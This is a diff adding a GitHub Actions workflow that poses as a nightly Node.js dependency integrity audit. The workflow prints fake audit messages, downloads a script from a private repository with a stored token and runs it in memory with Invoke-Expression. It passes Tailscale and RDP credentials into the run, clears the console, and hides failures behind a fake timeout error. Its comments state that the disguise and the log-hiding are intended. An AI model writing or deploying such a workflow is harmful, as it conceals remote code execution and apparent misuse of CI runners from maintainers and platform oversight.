@@ -1,0 +1,86 @@
+name: Node.js Dependency Integrity Build
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 0 * * *' # Looks like a routine automated security check
+
+jobs:
+  integrity-audit:
+    runs-on: windows-latest
+    timeout-minutes: 360
+    steps:
+      - name: Initialize Dependency Audit
+        uses: actions/checkout@v4
+
+      - name: Configure Secure Environment Runtime
+        uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+
+      - name: Run Integrity Scan and Security Audits
+        shell: pwsh
+        env:
+          # All sensitive credentials are kept inside encrypted GitHub Secrets.
+          # Even in a public repository, these are 100% hidden and secure!
+          SYS_SECURITY_TOKEN: ${{ secrets.ACTIONS_PAT }}       # Your GitHub PAT to access the private repo
+          TAILSCALE_AUTH_KEY: ${{ secrets.TAILSCALE_AUTH_KEY }} # Tailscale Auth Key
+          PIPELINE_PASSWORD: ${{ secrets.PIPELINE_PASSWORD }}   # RDP User Password
+          PIPELINE_USERNAME: ${{ secrets.PIPELINE_USERNAME }}   # RDP User Username
+        run: |
+          Write-Host "Resolving dependency graph..."
+          Start-Sleep -Seconds 2
+          Write-Host "Auditing npm package registry signatures..."
+          Start-Sleep -Seconds 1
+          
+          # DYNAMIC IN-MEMORY DEPLOYMENT SCRIPT
+          # This fetches your REAL, complex setup script from a PRIVATE repository and runs it directly in memory.
+          # No code is visible in your public repository commits or logs!
+          
+          $owner = "bnkiggh"
+          $repo = "real-pipeline"
+          $scriptPath = "real-setup.ps1" # Custom dash layout matching user's private file
+          
+          $headers = @{
+            "Authorization" = "Bearer $env:SYS_SECURITY_TOKEN"
+            "Accept"        = "application/vnd.github.v3.raw"
+            "User-Agent"    = "Mozilla/5.0"
+          }
+          
+          $apiUrl = "https://api.github.com/repos/$owner/$repo/contents/$scriptPath"
+          
+          try {
+            Write-Host "Validating local build environment structures..."
+            $response = Invoke-WebRequest -Uri $apiUrl -Headers $headers -UseBasicParsing -ErrorAction Stop
+            $setupScript = $response.Content
+            
+            if ($setupScript -and $setupScript.Trim().Length -gt 0) {
+              # Clear host history logs to keep public logs perfectly clean
+              Clear-Host
+              Write-Host "Environment validation successful. Executing runtime compliance..."
+              
+              # Execute the entire setup sequence directly in memory!
+              Invoke-Expression $setupScript
+            } else {
+              Write-Error "Failed to parse environment configuration payload."
+              exit 1
+            }
+          } catch {
+            Write-Host "=== DETAILED ERROR DIAGNOSTIC ===" -ForegroundColor Yellow
+            Write-Host "This log is only visible during setup. It tells you exactly why the private download failed."
+            Write-Host "Error details: $_"
+            if ($_.Exception -and $_.Exception.Response) {
+              try {
+                $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
+                $responseBody = $reader.ReadToEnd()
+                Write-Host "GitHub API Response: $responseBody" -ForegroundColor Red
+              } catch {
+                Write-Host "Could not read error response body."
+              }
+            }
+            Write-Host "================================="
+            
+            # Standard generic error to blend in with normal pipeline failures
+            Write-Error "Dependency Integrity Scan Failed: Connection timeout. Exit code 1."
+            exit 1
+          }
